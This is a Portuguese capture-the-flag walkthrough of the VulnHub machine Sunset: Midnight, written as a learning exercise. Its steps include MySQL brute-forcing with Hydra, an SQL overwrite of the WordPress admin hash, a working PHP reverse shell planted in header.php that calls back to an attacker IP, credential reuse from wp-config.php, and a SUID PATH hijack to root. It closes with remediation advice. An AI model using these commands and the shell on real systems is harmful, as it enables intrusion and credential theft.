# Sunset: Midnight — Segredos Escondidos na Hora Mais Sombria

Que cadeia impressionante essa, mano. Sunset: Midnight ensina algo real: quando um site WordPress está exposto junto com um serviço MySQL com senha root fraca, você não precisa quebrar o admin WordPress. Você vai diretamente ao banco de dados, sobrescreve o hash de senha, faz login, injeta um reverse shell em um arquivo de tema e passa pela porta principal. Pós-foothold, wp-config.php entrega a próxima credencial, e um binário SUID com hijack de PATH fecha o loop para root. Cadeia limpa. Paralelos com o mundo real em todo lugar. Muito respeito ao whitecr0wz.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Sunset: Midnight |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/sunset-midnight,517/ |
| **Técnicas** | Scan completo de portas, resolução de hostname, enumeração WordPress, brute-force MySQL (Hydra), manipulação direta de senha no banco de dados, RCE via arquivo de tema WordPress, reverse shell via header.php, reutilização de credencial wp-config.php, hijack de PATH em binário SUID |
| **CVEs** | CWE-521 — Requisitos de Senha Fracos (MySQL root com senha fraca); CWE-269 — Gerenciamento de Privilégios Inadequado (hijack de PATH em binário SUID); CWE-522 — Credenciais Insuficientemente Protegidas (wp-config.php reutilizado para contas OS) |
| **Grupos APT** | APT41: uso documentado de serviços MySQL expostos para brute-force de credenciais e bypass de autenticação baseado em banco de dados em operações de comprometimento web; FIN7: hijack de PATH via binário SUID é uma técnica documentada de movimentação lateral e escalonamento de privilégios em alvos Linux |

---

## Resumo do Ataque

```
nmap -A → porta 80 (WordPress), 3306 (MySQL), 22 (SSH)
  |
  +-> adicionar sunset-midnight ao /etc/hosts
  |
  +-> hydra -l root -P rockyou.txt mysql → root:SENHA
  |
  +-> mysql: UPDATE wp_users SET user_pass=MD5('123456')
  |
  +-> login wp-admin: admin:123456
  |
  +-> Aparência → Editor de Temas → header.php → PHP reverse shell
  |
  v
shell www-data (callback netcat)
  |
  +-> cat /var/www/html/wp-config.php → DB_PASSWORD
  |
  +-> su jose → (senha DB reutilizada)
  |
  v
shell usuário jose
  |
  +-> find / -perm -4000 → /usr/bin/status
  |
  +-> strings /usr/bin/status → chama "service" (caminho relativo)
  |
  +-> echo '/bin/sh' > /tmp/service
  +-> chmod +x /tmp/service
  +-> export PATH=/tmp:$PATH
  +-> /usr/bin/status → uid=0(root)
  |
  v
/root/root.txt
```

---

## Metodologia

1. Descoberta de host e scan completo de portas nmap
2. Hostname adicionado ao /etc/hosts conforme descrição da máquina
3. Site WordPress identificado, painel de login acessível
4. Serviço MySQL brute-forçado com Hydra
5. Hash de senha do admin WordPress sobrescrito via acesso direto ao banco de dados
6. Arquivo de tema (header.php) modificado com PHP reverse shell
7. Reverse shell capturado, shell estabilizado como www-data
8. Credenciais wp-config.php recuperadas para movimentação lateral para jose
9. Binário SUID /usr/bin/status descoberto, hijack de PATH executa shell root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -i eth0
nmap -A -p- 192.168.10.178
```

```bash
# Adicionar hostname (exigido pela descrição da máquina)
echo "192.168.10.178 sunset-midnight" >> /etc/hosts
```

Portas principais:

| Porta | Serviço | Observações |
|---|---|---|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Site WordPress |
| 3306 | MySQL | Exposto, aceita conexões remotas |

**Observação crítica:** MySQL na porta 3306 está exposto. Isso quase sempre é uma configuração incorreta em configurações de servidor web.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web

```bash
# Navegar no site WordPress
curl -s http://sunset-midnight/
curl -s http://sunset-midnight/wp-login.php

# wpscan rápido para usuários e versão
wpscan --url http://sunset-midnight/ --enumerate u,ap,at
```

WordPress está rodando. Login padrão em `/wp-login.php`. Sabemos que há um serviço MySQL rodando, então tomamos o caminho do banco de dados em vez de fazer brute-force diretamente no WordPress.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Brute-Force MySQL com Hydra

```bash
hydra -l root \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.10.178 mysql
```

Credenciais MySQL root recuperadas. A conta root aceita conexões remotas com uma senha fraca.

**Alternativa com medusa:**

```bash
medusa -h 192.168.10.178 -u root -P /usr/share/wordlists/rockyou.txt -M mysql
```

**Nota real:** MySQL exposto na porta 3306 com uma senha root brute-forçável é uma descoberta crítica em qualquer avaliação. APT41 documenta o direcionamento de serviços de banco de dados expostos como uma técnica primária de acesso inicial em operações de comprometimento web. A correção é simples: vincular MySQL ao localhost apenas.

**MITRE ATT&CK:** T1110.003 — Força Bruta: Password Spraying; T1190 — Exploração de Aplicação Voltada ao Público

---

## Passo 4 — Manipulação de Senha no Banco de Dados

Conecte ao MySQL e sobrescreva o hash de senha do admin WordPress:

```bash
# MD5 de "123456" = e10adc3949ba59abbe56e057f20f883e
mysql -u root -p<SENHA> -h 192.168.10.178

mysql> USE wordpress;
mysql> SELECT user_login, user_pass FROM wp_users;
mysql> UPDATE wp_users
       SET user_pass='e10adc3949ba59abbe56e057f20f883e'
       WHERE user_login='admin';
mysql> EXIT;
```

A senha do admin WordPress agora é `123456`.

**Nota real:** Acesso direto ao banco de dados para sobrescrever credenciais de autenticação é equivalente a um comprometimento completo da aplicação. Essa técnica bypassa todos os controles de segurança na camada de aplicação. FIN7 documenta essa abordagem em seus playbooks para WordPress e outras plataformas CMS acessíveis junto com MySQL exposto.

**MITRE ATT&CK:** T1098 — Manipulação de Conta; T1078 — Contas Válidas

---

## Passo 5 — Acesso Admin WordPress e Injeção de Reverse Shell

Login no admin WordPress em `http://sunset-midnight/wp-login.php` com `admin:123456`.

Navegue até: **Aparência → Editor de Temas → Selecione header.php**

Substitua o conteúdo do header.php por um PHP reverse shell PentestMonkey:

```php
<?php
set_time_limit(0);
$ip = '192.168.10.100';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
proc_close($process);
?>
```

Inicie o listener:

```bash
nc -nlvp 4444
```

Acesse `http://sunset-midnight/` para acionar o header.php modificado. Shell chega como `www-data`.

**MITRE ATT&CK:** T1505.003 — Componente de Software de Servidor: Web Shell; T1059.004 — Interpretador de Comando e Script: Shell Unix

---

## Passo 6 — Estabilização do Shell e wp-config.php

Estabilize o shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter duas vezes
```

Leia o arquivo de configuração WordPress:

```bash
cat /var/www/html/wp-config.php
```

O valor de `DB_PASSWORD` está presente. Tente como senha para o usuário de sistema `jose`:

```bash
su jose
# Senha: <DB_PASSWORD do wp-config.php>
```

Reutilização de credencial confirmada: a senha do banco de dados também é a senha da conta OS.

**Nota real:** Reutilização de credenciais entre camadas de aplicação e OS é a descoberta de movimentação lateral numero 1 em testes de penetração de aplicações web. wp-config.php é sempre lido pós-foothold. APT41 documenta wp-config.php como um alvo de exfiltração de alta prioridade em qualquer host WordPress comprometido.

**MITRE ATT&CK:** T1552.001 — Credenciais Não Seguras: Credenciais em Arquivos; T1078 — Contas Válidas

---

## Passo 7 — Escalonamento de Privilégios via Hijack de PATH SUID

Enumere binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Descoberta: `/usr/bin/status` é SUID root.

Analise o binário:

```bash
strings /usr/bin/status
# Saída inclui "service" — chamado por caminho relativo
```

O binário chama `service` sem um caminho absoluto. Sequestre o PATH:

```bash
# Criar binário service malicioso
echo '/bin/sh' > /tmp/service
chmod +x /tmp/service

# Preparar /tmp no PATH para que nosso service seja encontrado primeiro
export PATH=/tmp:$PATH

# Executar o binário SUID
/usr/bin/status
```

Shell root é iniciado.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. Meia-noite concluída, mano!

**Nota real:** Hijack de PATH de binários SUID que chamam comandos externos por caminho relativo é uma descoberta consistente em auditorias de escalonamento de privilégios Linux. A correção é uma palavra: use caminhos absolutos em todos os scripts e binários que executam com privilégios elevados. FIN7 documenta a manipulação de PATH como uma técnica padrão de escalonamento pós-foothold.

**MITRE ATT&CK:** T1574.007 — Sequestro de Fluxo de Execução: Interceptação de Path por Variável de Ambiente PATH; T1548.001 — Mecanismo de Controle de Elevação de Abuso: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Usado Para |
|---|---|---|---|
| MySQL root | root:(brute-forçado) | Porta 3306 | Acesso ao banco de dados |
| Admin WordPress | admin:123456 (substituído) | Tabela wp_users MySQL | Acesso admin WP |
| Senha DB | valor DB_PASSWORD | /var/www/html/wp-config.php | Su para jose |
| Usuário jose | (senha DB reutilizada) | Reutilização de credencial wp-config.php | Movimentação lateral de usuário |
| Root | uid=0 via hijack de PATH SUID | /usr/bin/status + /tmp/service | Shell root |
| Flag root | /root/root.txt | Pós-exploração | Máquina concluída |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Lição Principal |
|---|---|---|---|
| 1 | MySQL exposto na porta 3306 com senha root brute-forçável | Serviços de banco de dados expostos com credenciais fracas são uma descoberta crítica em toda avaliação web | Vincular MySQL ao localhost apenas: adicionar `bind-address = 127.0.0.1` ao my.cnf |
| 2 | Acesso direto ao banco de dados bypassa toda autenticação de aplicação | Credencial admin WordPress torna-se irrelevante quando o banco de dados é diretamente acessível | Nunca expor serviços de banco de dados a redes não confiáveis; usar regras de firewall |
| 3 | Edição de arquivo de tema WordPress concede RCE instantâneo a partir do admin | Acesso admin ao CMS = shell OS. Sempre | Desabilitar edição de tema/plugin: `define('DISALLOW_FILE_EDIT', true);` no wp-config.php |
| 4 | Credenciais wp-config.php reutilizadas para contas OS | Reutilização de credenciais entre camadas é a descoberta de movimentação lateral mais comum | Usar credenciais únicas e dedicadas por serviço; nunca compartilhar senhas de DB e conta OS |
| 5 | Binário SUID com execução de comando de caminho relativo | Hijack de PATH é trivial uma vez que você controla um diretório gravável no início do PATH | Usar caminhos absolutos em todos os scripts e binários privilegiados; auditar todos os binários SUID |

---

## MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Voltada ao Público (MySQL) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying (MySQL) | T1110.003 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras em Arquivos (wp-config.php) | T1552.001 |
| Evasão de Defesa | Evasão de Defesa | Manipulação de Conta (sobrescrita de hash de senha) | T1098 |
| Execução | Execução | Componente de Software de Servidor: Web Shell | T1505.003 |
| Execução | Execução | Interpretador de Comando e Script: Shell Unix | T1059.004 |
| Movimentação Lateral | Movimentação Lateral | Contas Válidas (reutilização de credencial) | T1078 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Sequestro de Fluxo de Execução: Variável de Ambiente PATH | T1574.007 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Mecanismo de Controle de Elevação de Abuso: Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Vincular MySQL ao localhost:** adicionar `bind-address = 127.0.0.1` ao `/etc/mysql/my.cnf`; bloquear porta 3306 de todo acesso externo
2. **Usar credenciais MySQL únicas e fortes:** nunca usar senhas fracas para contas root de banco de dados
3. **Desabilitar edição de arquivo de tema/plugin WordPress:** adicionar `define('DISALLOW_FILE_EDIT', true);` ao wp-config.php
4. **Usar credenciais únicas por serviço:** DB_PASSWORD não deve ser reutilizado para contas OS
5. **Usar caminhos absolutos em binários SUID:** auditar com `strings` e corrigir qualquer chamada de comando de caminho relativo em binários privilegiados
6. **Auditar regularmente binários SUID:** `find / -perm -u=s -type f 2>/dev/null`; remover SUID de binários que não precisam

### D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (bind-address MySQL; edição de arquivos WordPress desabilitada)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (auditoria SUID; caminhos absolutos em binários privilegiados)
- **D3-NTF** — Filtragem de Tráfego de Rede (bloquear porta MySQL 3306 de redes não confiáveis)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar serviços de banco de dados expostos e sua acessibilidade de rede |
| Proteger | Controle de Acesso | Vincular MySQL ao localhost; aplicar senhas DB únicas e fortes |
| Proteger | Segurança de Dados | Desabilitar edição de arquivos WordPress; usar credenciais únicas por serviço |
| Detectar | Anomalias e Eventos | Alertar sobre conexões MySQL remotas; modificações de arquivo de tema WordPress |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais comprometidas; corrigir binário SUID; desabilitar acesso MySQL remoto |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todos os serviços de banco de dados e reutilização de credenciais |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Vinculação de rede MySQL; restrições de edição de arquivo admin WordPress |
| AC-6 | Menor Privilégio | Contas de serviço de banco de dados com permissões mínimas; auditoria de binário SUID |
| IA-5 | Gerenciamento de Autenticadores | Credenciais únicas e fortes por serviço; sem reutilização de credenciais |
| CM-7 | Menor Funcionalidade | MySQL vinculado ao localhost; desabilitar edição de arquivo remoto WordPress |
| SC-7 | Proteção de Fronteira | Bloquear MySQL de redes não confiáveis |
| SI-2 | Remediação de Falhas | Corrigir chamadas de caminho absoluto em binário SUID; atualizar configuração MySQL |

### CISA KEV

MySQL exposto com credenciais fracas mapeia ao Alerta CISA AA22-074A (Vulnerabilidades Conhecidas Exploradas) e orientação CISA AA21-008A sobre exposição de serviço de banco de dados. O padrão de RCE via arquivo de tema WordPress mapeia a múltiplos avisos CISA sobre exploração de CMS. A CISA consistentemente identifica serviços de banco de dados expostos como um item de remediação de prioridade máxima.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL3 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |

---

## Considerações Finais

Sunset: Midnight é uma aula magistral em configuração incorreta em camadas. Cada passo compõe o anterior: MySQL exposto permite bypass de DB, bypass de DB permite admin WP, admin WP permite RCE, wp-config.php permite movimentação lateral, e um binário SUID fecha o root. Nenhuma dessas etapas exigiu um exploit CVE. Todas elas exigiram apenas consciência de configuração incorreta e enumeração metódica. Isso é teste de penetração real, sério mesmo!

Thanks guys!! (❍ᴥ❍ʋ)
